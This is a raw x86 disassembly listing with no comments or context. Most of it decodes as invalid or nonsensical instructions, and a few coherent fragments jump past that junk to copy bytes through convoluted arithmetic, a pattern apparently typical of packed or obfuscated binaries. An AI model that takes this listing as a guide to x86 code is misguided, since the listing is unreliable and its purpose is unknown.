  40da18:	push   eax
  40da19:	mov    ch,0xd3
  40da1b:	fdiv   QWORD PTR [ebp+0x39]
  40da1e:	jecxz  0x40da52
  40da20:	sub    eax,0xa5895dea
  40da25:	cwde   
  40da26:	add    eax,DWORD PTR [edi+ecx*1+0xaac12e8]
  40da2d:	mov    edi,ds
  40da2f:	push   ecx
  40da30:	and    eax,0x245cc225
  40da35:	inc    esi
  40da36:	push   ecx
  40da37:	sbb    DWORD PTR [ecx+0x6bbd2270],esp
  40da3d:	push   ds
  40da3e:	(bad)  
  40da3f:	dec    esp
  40da40:	add    DWORD PTR [ebx+0x5c],0x16978c9c
  40da47:	jae    0x40d9d0
  40da49:	sbb    ch,dh
  40da4b:	inc    esi
  40da4c:	dec    esi
  40da4d:	lods   al,BYTE PTR ds:[esi]
  40da4e:	and    al,0xf5
  40da50:	mov    ds:0xe33e3f80,al
  40da55:	pop    esp
  40da56:	ret    0x7206
  40da59:	data16 lahf 
  40da5b:	and    al,0x26
  40da5d:	aas    
  40da5e:	loop   0x40da08
  40da60:	and    DWORD PTR [ebx+0x3897ecbb],esp
  40da66:	int3   
  40da67:	mov    al,ds:0x5ab6a25e
  40da6c:	hlt    
  40da6d:	add    BYTE PTR [ebp+0x5bf6d5ce],bh
  40da73:	dec    ebp
  40da74:	and    DWORD PTR [esp+edi*8],ebx
  40da77:	push   edi
  40da78:	ror    BYTE PTR [esi-0x24005c18],cl
  40da7e:	mov    al,BYTE PTR [esi]
  40da80:	mov    al,ds:0x9f62f37f
  40da85:	dec    eax
  40da86:	push   0x2de7d73f
  40da8b:	cwde   
  40da8c:	shr    BYTE PTR [eax],1
  40da8e:	push   edx
  40da8f:	push   esi
  40da90:	(bad)  
  40da92:	push   ds
  40da93:	sub    ecx,ebp
  40da95:	mov    al,0xa6
  40da97:	and    DWORD PTR [eax-0x69b17d9],eax
  40da9d:	or     esi,0xffffffc9
  40daa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa1:	add    eax,0x11fff0e2
  40daa6:	add    eax,0x98a22202
  40daab:	ins    BYTE PTR es:[di],dx
  40daad:	rcl    BYTE PTR [esi],1
  40daaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dab0:	push   ds
  40dab1:	xchg   ecx,eax
  40dab2:	(bad)  
  40dab3:	jp     0x40daae
  40dab5:	stos   BYTE PTR es:[edi],al
  40dab6:	jns    0x40db0b
  40dab8:	xchg   ebp,eax
  40daba:	cli    
  40dabb:	ja     0x40db13
  40dabd:	dec    esi
  40dabe:	pop    edx
  40dabf:	frstor [ebp+0x5619db20]
  40dac5:	sbb    DWORD PTR [ecx],edi
  40dac7:	mov    bh,BYTE PTR [ebx+0x51]
  40daca:	push   es
  40dacb:	jns    0x40db22
  40dacd:	test   eax,0x5c640cf0
  40dad2:	cld    
  40dad3:	hlt    
  40dad4:	(bad)  
  40dad5:	lods   eax,DWORD PTR ds:[esi]
  40dad6:	jmp    0xaa03:0xa0f6d9da
  40dadd:	ins    BYTE PTR es:[edi],dx
  40dade:	xchg   esp,eax
  40dadf:	mov    BYTE PTR [esi],al
  40dae1:	mov    ds:0x1d470b81,al
  40dae6:	push   ss
  40dae7:	fistp  DWORD PTR [esp+edi*8-0x588755cb]
  40daee:	sub    ebp,DWORD PTR [edx]
  40daf0:	jno    0x40db2b
  40daf2:	pop    edx
  40daf3:	lods   eax,DWORD PTR ds:[esi]
  40daf4:	jl     0x40dab6
  40daf6:	dec    edx
  40daf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daf8:	dec    eax
  40daf9:	adc    BYTE PTR [edx-0x22],ah
  40dafc:	lods   eax,DWORD PTR ds:[esi]
  40dafd:	add    BYTE PTR [ebp-0x139b0460],ah
  40db03:	sbb    eax,0x6e414bfa
  40db08:	adc    al,0xa4
  40db0a:	push   eax
  40db0b:	pop    edi
  40db0c:	lahf   
  40db0d:	jne    0x40dae3
  40db0f:	cs mov cl,0xa
  40db12:	add    BYTE PTR [edi*2+0x7ef35a06],0xb3
  40db1a:	fldenv [ebp+0x18ef4f73]
  40db20:	test   BYTE PTR [eax-0x2ed961b5],0xd6
  40db27:	add    eax,0x638f7570
  40db2c:	mov    esp,0x61b9c063
  40db31:	pop    ds
  40db32:	add    eax,0x2fba6eaf
  40db37:	jnp    0x40dabd
  40db39:	adc    al,0x19
  40db3b:	test   DWORD PTR [ecx+0x1f015cf4],esp
  40db41:	int3   
  40db42:	idiv   BYTE PTR [ebp+0x6908458b]
  40db48:	leave  
  40db49:	add    DWORD PTR [esi],ebp
  40db4b:	add    BYTE PTR [eax],al
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40dc0c
  40db97:	fst    DWORD PTR [ecx+0x18d25b70]
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    BYTE PTR [esi-0x25],cl
  40dba4:	in     al,dx
  40dba5:	cs enter 0x5ea2,0xfc
  40dbaa:	test   DWORD PTR [eax],edi
  40dbac:	sti    
  40dbad:	popf   
  40dbae:	add    esi,DWORD PTR [edi]
  40dbb0:	jne    0x40db56
  40dbb2:	aaa    
  40dbb3:	jle    0x40dbb7
  40dbb5:	mov    bl,0x74
  40dbb7:	push   ecx
  40dbb8:	repz cdq 
  40dbba:	add    al,0x12
  40dbbc:	je     0x40db98
  40dbbe:	sub    DWORD PTR [ebx],esp
  40dbc0:	retf   0x28bf
  40dbc3:	int    0x4c
  40dbc5:	fcom   DWORD PTR ds:0xbd317c08
  40dbcb:	mov    ebx,0x46b3c73
  40dbd0:	stc    
  40dbd1:	dec    ebx
  40dbd2:	and    esp,DWORD PTR [ecx+edi*2]
  40dbd5:	repz enter 0x6266,0x8d
  40dbda:	mov    edx,0x5d5e84b8
  40dbdf:	ins    BYTE PTR es:[edi],dx
  40dbe0:	retf   
  40dbe1:	jecxz  0x40dc0f
  40dbe3:	add    ebp,DWORD PTR [eax]
  40dbe5:	call   0x438a88a3
  40dbea:	jns    0x40dc57
  40dbec:	jnp    0x40dc25
  40dbee:	outs   dx,DWORD PTR ds:[esi]
  40dbef:	repnz mov ecx,0x6ccbfd6e
  40dbf5:	jle    0x40dbd3
  40dbf7:	pushf  
  40dbf8:	out    0xfe,al
  40dbfa:	stos   BYTE PTR es:[edi],al
  40dbfb:	push   esi
  40dbfc:	mov    gs,WORD PTR ds:0x8bd7e6ba
  40dc02:	lods   eax,DWORD PTR ds:[esi]
  40dc03:	dec    ebx
  40dc04:	mov    esi,0xe2478a33
  40dc09:	dec    ebx
  40dc0a:	into   
  40dc0b:	outs   dx,BYTE PTR ds:[esi]
  40dc0c:	ss or  al,0x32
  40dc0f:	sbb    al,0x1f
  40dc11:	cmp    esi,DWORD PTR fs:0xea8200ac
  40dc18:	in     eax,dx
  40dc19:	cmp    BYTE PTR [edi],0x93
  40dc1c:	and    DWORD PTR [ecx+0x8],esp
  40dc1f:	push   edx
  40dc20:	int    0x37
  40dc22:	(bad)  
  40dc23:	xor    BYTE PTR [eax],bh
  40dc25:	push   ss
  40dc26:	push   ebp
  40dc27:	push   esi
  40dc28:	xchg   esp,eax
  40dc29:	lahf   
  40dc2a:	mov    edx,0x7b7e9828
  40dc2f:	push   edx
  40dc30:	mov    ebp,0xd1171478
  40dc35:	xor    al,0x16
  40dc37:	dec    ebx
  40dc38:	and    al,0xdf
  40dc3a:	push   ds
  40dc3b:	adc    al,dl
  40dc3d:	mov    esi,0xba852fe
  40dc42:	adc    BYTE PTR [ecx],ch
  40dc44:	or     DWORD PTR [ebp-0x80],edi
  40dc47:	mov    ds:0xb2a47aa1,al
  40dc4c:	dec    ebx
  40dc4d:	ins    BYTE PTR es:[edi],dx
  40dc4e:	rcr    DWORD PTR [edx],1
  40dc50:	stos   BYTE PTR es:[edi],al
  40dc51:	pusha  
  40dc52:	cmc    
  40dc53:	jae    0x40dc6b
  40dc55:	inc    edx
  40dc56:	adc    bh,dh
  40dc58:	jecxz  0x40dbdb
  40dc5a:	inc    esi
  40dc5b:	ins    DWORD PTR es:[edi],dx
  40dc5c:	popw   ss
  40dc5e:	and    DWORD PTR ds:0xcedfd9f5,eax
  40dc64:	shr    DWORD PTR [ecx],cl
  40dc66:	frstor [edx+0x3ec77f9f]
  40dc6c:	int    0x80
  40dc6e:	mov    ds:0xca9b78c4,eax
  40dc73:	pop    esi
  40dc74:	cmp    al,0x46
  40dc76:	mov    esp,0x939eb20d
  40dc7b:	(bad)  
  40dc7c:	jnp    0x40dcf8
  40dc7e:	add    al,0x79
  40dc80:	sub    edi,esp
  40dc82:	xor    bl,BYTE PTR [eax-0x5f]
  40dc85:	adc    eax,0xf888b3fc
  40dc8a:	dec    eax
  40dc8b:	retf   
  40dc8c:	xchg   DWORD PTR [ebx-0x360ecfa4],edx
  40dc92:	push   edx
  40dc93:	mov    esi,0xd33d84ae
  40dc98:	mov    dh,0x40
  40dc9a:	fmul   DWORD PTR [edx-0x6e]
  40dc9d:	mov    dl,0xa0
  40dc9f:	cmp    al,BYTE PTR [edi+0x2c2fa67]
  40dca5:	jl     0x40dc6f
  40dca7:	repz mov bh,0x78
  40dcaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcab:	loope  0x40dc80
  40dcad:	jbe    0x40dc53
  40dcaf:	bound  eax,QWORD PTR [eax]
  40dcb1:	jae    0x40dd15
  40dcb3:	pop    ebp
  40dcb4:	sub    al,BYTE PTR [ebx]
  40dcb6:	aad    0x4d
  40dcb8:	dec    eax
  40dcb9:	jg     0x40dc80
  40dcbb:	dec    ebp
  40dcbc:	and    edi,esi
  40dcbe:	out    0xd0,eax
  40dcc0:	rcr    ecx,0x90
  40dcc3:	sub    BYTE PTR [eax+0x14ca4cb0],dl
  40dcc9:	add    DWORD PTR [ebx-0x556b533],esi
  40dccf:	or     eax,DWORD PTR [ebp+0x682f8375]
  40dcd5:	xchg   ebx,eax
  40dcd6:	retf   0xa3e9
  40dcd9:	push   ds
  40dcda:	and    eax,0x88f2646a
  40dcdf:	pop    eax
  40dce0:	cmp    BYTE PTR [eax],dh
  40dce2:	inc    edx
  40dce3:	and    al,0x6f
  40dce5:	(bad)  
  40dce6:	jo     0x40dd52
  40dce8:	cmp    ebx,DWORD PTR [esi+ecx*8]
  40dceb:	xor    BYTE PTR [esp+eiz*2],0x2a
  40dcef:	xor    al,0x87
  40dcf1:	les    edx,FWORD PTR ds:0xc5714697
  40dcf7:	shr    DWORD PTR [esi],cl
  40dcf9:	adc    eax,0x520bb5cd
  40dcfe:	jg     0x40dcaa
  40dd00:	mov    dh,0x34
  40dd02:	add    BYTE PTR ds:0xdd0abdde,ah
  40dd08:	ret    
  40dd09:	mov    ds:0x21a1588f,eax
  40dd0e:	jb     0x40dd72
  40dd10:	ds cs jns 0x40dd93
  40dd14:	or     esp,DWORD PTR [eax]
  40dd16:	mov    al,0xcb
  40dd18:	pop    ebx
  40dd19:	imul   esi,eax,0x52
  40dd1c:	shr    BYTE PTR [esi-0x52],1
  40dd1f:	pop    ecx
  40dd20:	sub    DWORD PTR [ebp+0x5d486a9c],ebx
  40dd26:	mov    edx,0x3b98fdad
  40dd2b:	cmp    al,0x6c
  40dd2d:	sub    eax,0x2aebca6c
  40dd32:	sti    
  40dd33:	gs jmp 0xb556:0xa63fdc6d
  40dd3b:	and    al,0xaf
  40dd3d:	(bad)  
  40dd3e:	lods   eax,DWORD PTR ds:[esi]
  40dd3f:	cwde   
  40dd40:	cld    
  40dd41:	cmp    edi,DWORD PTR [esi]
  40dd43:	pop    esi
  40dd44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd45:	jmp    0xf598:0x6b8f3714
  40dd4c:	idiv   ebp
  40dd4e:	jecxz  0x40ddb1
  40dd50:	jns    0x40dd5a
  40dd52:	js     0x40dda1
  40dd54:	jmp    0x40dd48
  40dd56:	xor    DWORD PTR [edx],edx
  40dd58:	xor    DWORD PTR [edx+ecx*8-0xf],ecx
  40dd5c:	pop    esp
  40dd5d:	xor    DWORD PTR [ebp+0x7cfab55e],ecx
  40dd63:	cli    
  40dd64:	mov    bh,0x58
  40dd66:	dec    esi
  40dd67:	enter  0xe7e6,0x6d
  40dd6b:	sub    eax,0x5eacfe33
  40dd70:	mov    edi,0x1d4de0e6
  40dd75:	in     al,dx
  40dd76:	pop    ebx
  40dd77:	and    esi,DWORD PTR [ebp+0x1e]
  40dd7a:	lods   eax,DWORD PTR ds:[esi]
  40dd7b:	mov    ch,0x0
  40dd7d:	jne    0x40dd5f
  40dd7f:	lods   eax,DWORD PTR ds:[esi]
  40dd80:	repz jecxz 0x40dde0
  40dd83:	cmp    ch,ch
  40dd85:	ror    DWORD PTR es:[esi+0x4],0x26
  40dd8a:	adc    eax,0xf4ddc36b
  40dd8f:	lahf   
  40dd90:	xlat   BYTE PTR ds:[ebx]
  40dd91:	scas   eax,DWORD PTR es:[edi]
  40dd92:	push   0xcb499aa5
  40dd97:	mov    ebp,0xc00f1510
  40dd9c:	shl    BYTE PTR [ebx],0x5f
  40dd9f:	dec    ecx
  40dda0:	mov    al,BYTE PTR ds:0xf3fcea2e
  40dda6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dda7:	cmc    
  40dda8:	lods   eax,DWORD PTR ds:[esi]
  40dda9:	fstp   QWORD PTR [edx+0x4768a54c]
  40ddaf:	iret   
  40ddb0:	sub    DWORD PTR [eax+0x326fe82f],0x72c359ff
  40ddba:	outs   dx,DWORD PTR ds:[esi]
  40ddbb:	lock mov eax,DWORD PTR [ebx-0x65f33f8f]
  40ddc2:	sbb    bl,0x77
  40ddc5:	sub    esi,DWORD PTR [ebx+0x5a]
  40ddc8:	into   
  40ddc9:	jno    0x40dd4b
  40ddcb:	mov    ch,0x5e
  40ddcd:	adc    al,0xc6
  40ddcf:	jge    0x40de3f
  40ddd1:	repz popa 
  40ddd3:	fild   QWORD PTR [ecx]
  40ddd5:	(bad)  [esi]
  40ddd7:	outs   dx,BYTE PTR ds:[esi]
  40ddd8:	ja     0x40dde0
  40ddda:	cdq    
  40dddb:	ret    0xaa15
  40ddde:	nop
  40dddf:	pusha  
  40dde0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dde1:	pop    ebx
  40dde2:	jo     0x40de04
  40dde4:	adc    dh,0x74
  40dde7:	imul   esi,DWORD PTR [ebp+0x4b],0xffffffbf
  40ddeb:	int3   
  40ddec:	mov    fs,edi
  40ddee:	call   0x3e7583c0
  40ddf3:	cs dec edi
  40ddf5:	xor    al,0x8b
  40ddf7:	jo     0x40de72
  40ddf9:	add    al,0xf9
  40ddfb:	inc    ecx
  40ddfc:	xchg   eax,eax
  40ddfe:	cli    
  40ddff:	cld    
  40de00:	add    DWORD PTR [edi-0x232e489c],esi
  40de06:	xchg   ebp,eax
  40de07:	call   edx
  40de09:	mov    edi,0x885d9050
  40de0e:	push   ds
  40de0f:	leave  
  40de10:	push   esp
  40de11:	test   eax,0x105218a1
  40de16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de17:	mov    ebp,0xe256bb5e
  40de1c:	push   ss
  40de1d:	das    
  40de1e:	push   edx
  40de1f:	add    DWORD PTR ds:0xf778d643,0x130154b7
  40de29:	fcomp  QWORD PTR [ebx-0x56e7c1be]
  40de2f:	rcl    esi,cl
  40de31:	out    dx,eax
  40de32:	dec    esp
  40de33:	sbb    DWORD PTR [ebp+edx*4+0x16],eax
  40de37:	fs pop esi
  40de39:	adc    eax,edx
  40de3b:	mov    edx,0x1e2d0658
  40de40:	sub    al,0x3e
  40de42:	in     al,0xed
  40de44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de45:	out    dx,al
  40de46:	fwait
  40de47:	mov    DWORD PTR [ecx],edi
  40de49:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40de50:	mov    DWORD PTR [ebp-0x14],0x13cd
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422568
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40df2b
  40deca:	sub    eax,DWORD PTR [ebx+0x18cc147c]
  40ded0:	sbb    dl,dl
  40ded2:	adc    al,0x18
  40ded4:	sbb    BYTE PTR [esi-0x6d],bl
  40ded7:	ret    
  40ded8:	fsubp  st(7),st
  40deda:	jo     0x40df04
  40dedc:	fimul  DWORD PTR [edx+0x66]
  40dedf:	out    0x7e,eax
  40dee1:	xchg   esp,eax
  40dee2:	add    BYTE PTR ds:0xdadd64c2,cl
  40dee8:	mov    al,0xa8
  40deea:	or     BYTE PTR [ebp-0x5b],ch
  40deed:	add    BYTE PTR [ecx-0x51],ah
  40def0:	sbb    DWORD PTR [ecx],ebx
  40def2:	mov    ebp,0x41ec415c
  40def7:	add    al,0x35
  40def9:	loope  0x40deaa
  40defb:	(bad)  
  40defc:	push   edi
  40defd:	jb     0x40df70
  40deff:	retf   0xa1d9
  40df02:	js     0x40de9a
  40df04:	adc    BYTE PTR [ecx],cl
  40df06:	pop    ss
  40df07:	xchg   esp,eax
  40df08:	int3   
  40df09:	jne    0x40df00
  40df0b:	pop    ebx
  40df0c:	sub    DWORD PTR [ecx+0x74ae9f90],edx
  40df12:	cmp    eax,edx
  40df14:	fs gs test eax,0x4abb4b52
  40df1b:	sub    BYTE PTR [ebp+0xa],ch
  40df1e:	push   ecx
  40df1f:	repnz stc 
  40df21:	xor    ecx,DWORD PTR [edx+0x337f09e2]
  40df27:	scas   al,BYTE PTR es:[edi]
  40df28:	or     edi,DWORD PTR [esi+0x77]
  40df2b:	jge    0x40df07
  40df2d:	(bad)  
  40df2f:	cli    
  40df30:	clc    
  40df31:	push   esi
  40df32:	xor    eax,0x8a79d02b
  40df37:	mov    ds:0xe34906c5,eax
  40df3c:	jp     0x40df93
  40df3e:	cmp    esi,DWORD PTR [esi]
  40df40:	jns    0x40dfa3
  40df42:	dec    ecx
  40df43:	loop   0x40df9a
  40df45:	sbb    eax,0x4c0023f0
  40df4a:	pop    esp
  40df4b:	mov    edx,0x8123e347
  40df50:	jle    0x40df14
  40df52:	sbb    BYTE PTR [edi-0x11a1d3fb],dh
  40df58:	arpl   bx,sp
  40df5a:	xlat   BYTE PTR ds:[ebx]
  40df5b:	push   es
  40df5c:	cmp    al,0x1
  40df5e:	sub    bh,BYTE PTR cs:[eax]
  40df61:	inc    eax
  40df62:	shl    BYTE PTR ds:0x7b81b210,1
  40df68:	dec    ebp
  40df69:	addr16 aad 0x8e
  40df6c:	mov    BYTE PTR [ebp+0x51],ah
  40df6f:	repz mov al,0xc7
  40df72:	cli    
  40df73:	pop    ds
  40df74:	xchg   ebx,eax
  40df75:	push   0x45a92ec4
  40df7a:	int3   
  40df7b:	shr    esi,cl
  40df7d:	jl     0x40df6f
  40df7f:	rcl    DWORD PTR [ebx+0x12],cl
  40df82:	lods   al,BYTE PTR ds:[esi]
  40df83:	inc    ebp
  40df84:	adc    al,0x6c
  40df86:	mov    al,0xe7
  40df88:	mov    ch,0xb4
  40df8a:	add    BYTE PTR [ecx-0x2],0x90
  40df8e:	and    DWORD PTR [eax+0x6ea7fdbb],0xebca98c5
  40df98:	gs xchg ebp,eax
  40df9a:	sub    BYTE PTR [edx+0x6c],ah
  40df9d:	jns    0x40df27
  40df9f:	pop    es
  40dfa0:	mov    ch,0xfa
  40dfa2:	inc    esi
  40dfa3:	cmp    cl,ah
  40dfa5:	retf   0xb507
  40dfa8:	inc    ebx
  40dfa9:	lahf   
  40dfaa:	xor    al,0x4b
  40dfac:	jle    0x40df7a
  40dfae:	rol    DWORD PTR [edi-0x6d],cl
  40dfb1:	ins    DWORD PTR es:[edi],dx
  40dfb2:	inc    ecx
  40dfb3:	mov    edi,0x65ebb390
  40dfb8:	and    al,0x91
  40dfba:	std    
  40dfbb:	test   al,0x6d
  40dfbd:	fsub   DWORD PTR [ebp-0x30]
  40dfc0:	sub    ebx,ebp
  40dfc2:	out    dx,al
  40dfc3:	imul   ebx,DWORD PTR [eax],0x64fb737a
  40dfc9:	mov    al,ds:0xb14d4f50
  40dfce:	out    0xc4,al
  40dfd0:	inc    esp
  40dfd1:	mov    al,ds:0xd78444e1
  40dfd6:	sbb    BYTE PTR [edx],ch
  40dfd8:	xchg   BYTE PTR [eax+edi*8+0x6417822],dh
  40dfdf:	and    eax,0xd03cafe4
  40dfe4:	xor    DWORD PTR [ebx],ebp
  40dfe6:	sahf   
  40dfe7:	mov    bh,0xcd
  40dfe9:	pop    ecx
  40dfea:	add    al,0x97
  40dfec:	jecxz  0x40dfee
  40dfee:	fdivr  st(0),st
  40dff0:	ret    0x3546
  40dff3:	enter  0x3d80,0x73
  40dff7:	(bad)  
  40dff8:	(bad)  
  40dffa:	mov    edi,0x54d5ce10
  40dfff:	mov    ebx,0xaff709c6
  40e004:	xchg   esp,eax
  40e005:	pop    edx
  40e006:	push   ss
  40e007:	in     al,0xe5
  40e009:	cs nop
  40e00b:	xor    ebp,DWORD PTR [esi-0x6f]
  40e00e:	stos   BYTE PTR es:[edi],al
  40e00f:	and    DWORD PTR [ecx-0x573bdf3b],ebp
  40e015:	or     DWORD PTR [esi-0x19606580],ebp
  40e01b:	or     eax,0x1633731f
  40e020:	test   eax,0x97a072a3
  40e025:	bound  esi,QWORD PTR [edx]
  40e027:	and    ah,ah
  40e029:	pusha  
  40e02a:	nop
  40e02b:	cmp    DWORD PTR [eax-0xdbd7fbe],esp
  40e031:	mov    WORD PTR [edi],ss
  40e033:	sar    DWORD PTR [ecx+0xa97d30d],cl
  40e039:	icebp  
  40e03a:	jmp    0x8aa93abc
  40e03f:	sbb    eax,0x9caffb2b
  40e044:	mov    gs,WORD PTR [esi+esi*2+0x46]
  40e048:	iret   
  40e049:	leave  
  40e04a:	pop    es
  40e04b:	push   edx
  40e04c:	adc    al,0xe9
  40e04e:	ss scas al,BYTE PTR es:[edi]
  40e050:	jno    0x40e0c3
  40e052:	mov    BYTE PTR [edi-0x17],ch
  40e055:	sar    bl,cl
  40e057:	sbb    al,0xcc
  40e059:	call   0x5c03c080
  40e05e:	(bad)  
  40e05f:	leave  
  40e060:	loop   0x40e059
  40e062:	daa    
  40e063:	mov    ds:0x688b5ed5,al
  40e068:	scas   eax,DWORD PTR es:[edi]
  40e069:	or     al,0x23
  40e06b:	sti    
  40e06c:	push   ss
  40e06d:	out    dx,al
  40e06e:	ror    DWORD PTR [esi+0x4903ddd],cl
  40e074:	jmp    0x5a3d9a43
  40e079:	dec    eax
  40e07a:	push   cs
  40e07b:	sti    
  40e07c:	mov    dl,0xae
  40e07e:	pop    eax
  40e07f:	in     eax,0x8e
  40e081:	cmc    
  40e082:	and    eax,0x11dd589e
  40e087:	mov    edi,0x38ce4357
  40e08c:	repz jp 0x40e060
  40e08f:	pop    edi
  40e090:	and    BYTE PTR [ecx+0x27],cl
  40e093:	mov    bl,0xbb
  40e095:	imul   edx,DWORD PTR [ebx],0xb3901f3c
  40e09b:	lods   eax,DWORD PTR ds:[esi]
  40e09c:	sbb    BYTE PTR [edx+0x93a5417],bl
  40e0a2:	outs   dx,BYTE PTR ds:[esi]
  40e0a3:	std    
  40e0a4:	mov    esp,0xd20b83c6
  40e0a9:	test   BYTE PTR [eax+0x3bf5bea8],al
  40e0af:	pop    ebp
  40e0b0:	aas    
  40e0b1:	jl     0x40e11b
  40e0b3:	mov    ebp,0x1959cf04
  40e0b8:	retf   
  40e0b9:	in     al,0x5b
  40e0bb:	sub    dh,BYTE PTR [ebp-0x63e446f9]
  40e0c1:	pop    esi
  40e0c2:	fadd   QWORD PTR [eax]
  40e0c4:	ins    BYTE PTR es:[edi],dx
  40e0c5:	mov    eax,ds:0xcbd1f2df
  40e0ca:	test   BYTE PTR [eax+0x13a63ad1],0x47
  40e0d1:	addr16 sbb eax,0x351df5bb
  40e0d7:	add    eax,0x5014a3ba
  40e0dc:	mov    al,ds:0x2055ec01
  40e0e1:	and    esi,DWORD PTR [edx+ebp*2]
  40e0e4:	cwde   
  40e0e5:	mov    ds:0xe1d6732e,al
  40e0ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0eb:	sub    BYTE PTR [esi+0x60],cl
  40e0ee:	or     BYTE PTR [ebx+0x1a],al
  40e0f1:	adc    eax,0x95a1bbee
  40e0f6:	out    dx,al
  40e0f7:	shl    BYTE PTR [eax],cl
  40e0f9:	dec    ebx
  40e0fa:	jp     0x40e177
  40e0fc:	push   eax
  40e0fd:	or     bh,ch
  40e0ff:	jle    0x40e110
  40e101:	lods   eax,DWORD PTR ds:[esi]
  40e102:	mov    dl,0xa9
  40e104:	inc    ebx
  40e105:	shl    BYTE PTR ds:0x62760cbb,0xc4
  40e10c:	or     al,0x71
  40e10e:	add    al,0x8b
  40e110:	add    edi,0xe00ccace
  40e116:	pushf  
  40e117:	sub    dl,BYTE PTR [edi+esi*1-0x72]
  40e11b:	xchg   esi,eax
  40e11c:	mov    al,ds:0x32a1960d
  40e121:	mov    ebx,0xed933fdb
  40e126:	jmp    0x40e162
  40e128:	jns    0x40e191
  40e12a:	pop    esi
  40e12b:	and    BYTE PTR [eax+0x5e],ch
  40e12e:	in     al,dx
  40e12f:	daa    
  40e130:	and    DWORD PTR [esi+0x10],esp
  40e133:	push   edx
  40e134:	xor    eax,0x2f830ccb
  40e139:	pop    esp
  40e13a:	sub    BYTE PTR [edx+ebp*4+0x21],bl
  40e13e:	xor    al,0x41
  40e140:	pop    eax
  40e141:	test   BYTE PTR [ebx+edi*4],0xb9
  40e145:	imul   edi,DWORD PTR [edx+0x7c],0x2d75136c
  40e14c:	test   eax,0x883e743d
  40e151:	cmp    BYTE PTR cs:[edi],dh
  40e154:	jno    0x40e195
  40e156:	adc    cl,ah
  40e158:	mov    ecx,0x19f79e8a
  40e15d:	inc    edi
  40e15e:	push   edx
  40e15f:	rol    DWORD PTR [esi],1
  40e161:	mov    ds:0xeb6e0cc2,al
  40e166:	xchg   ebp,eax
  40e167:	sbb    eax,0x1e51d364
  40e16c:	out    dx,al
  40e16d:	adc    DWORD PTR [esi-0x160884e9],0x8dce5f8
  40e177:	shl    BYTE PTR [edi+ebp*1],1
  40e17a:	mov    es,edx
  40e17c:	mov    eax,DWORD PTR [ebp-0x10]
  40e17f:	xor    eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e1f4
  40e199:	mov    edi,0xc8cebefa
  40e19e:	sbb    BYTE PTR [eax],bl
  40e1a0:	rcl    BYTE PTR [eax+ebx*1],cl
  40e1a3:	sbb    BYTE PTR [eax-0x3d],bh
  40e1a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1a7:	clc    
  40e1a8:	imul   ebx,DWORD PTR [ebp+0x8],0xef595c44
  40e1af:	icebp  
  40e1b0:	sub    bl,BYTE PTR [edi]
  40e1b2:	fs std 
  40e1b4:	mov    edi,0xe406170d
  40e1b9:	add    al,0xf4
  40e1bb:	dec    ebp
  40e1bc:	gs lahf 
  40e1be:	pop    ecx
  40e1bf:	fiadd  DWORD PTR [esi]
  40e1c1:	dec    ebx
  40e1c2:	dec    ebx
  40e1c3:	out    dx,eax
  40e1c4:	sub    eax,0xc10ad99b
  40e1c9:	pusha  
  40e1ca:	sub    al,BYTE PTR [edx]
  40e1cc:	out    dx,al
  40e1cd:	jmp    0x9b00:0xdefbb5c8
